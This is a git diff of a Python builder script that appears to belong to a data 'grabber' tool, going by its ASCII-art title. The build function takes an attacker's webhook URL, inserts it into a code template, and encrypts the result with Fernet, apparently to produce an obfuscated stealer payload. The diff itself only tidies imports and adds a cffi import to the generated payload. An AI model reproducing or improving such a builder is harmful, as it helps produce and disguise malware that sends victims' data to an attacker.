@@ -1,9 +1,10 @@
-from os import remove as delete_file, path
-from cryptography.fernet import Fernet
-from sys import platform as OS
 from argparse import ArgumentParser, Namespace
-from subprocess import run, PIPE
+from os import path
+from os import remove as delete_file
+from subprocess import PIPE, run
+from sys import platform as OS
 
+from cryptography.fernet import Fernet
 
 TITLE = '''
     ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
@@ -26,7 +27,7 @@ def build(webhook: str, out_file: str, debug: bool):
     code_file.close()
 
     index = code.find("WEBHOOK")
-    libs = code[0:index] + "\nfrom cryptography.fernet import Fernet\n"
+    libs = code[0:index] + "\nimport cffi\nfrom cryptography.fernet import Fernet\n"
     content = code[index:-1].replace("{WEBHOOK}", str(webhook))
 
     encrypted_content = Fernet(KEY).encrypt(content.encode())
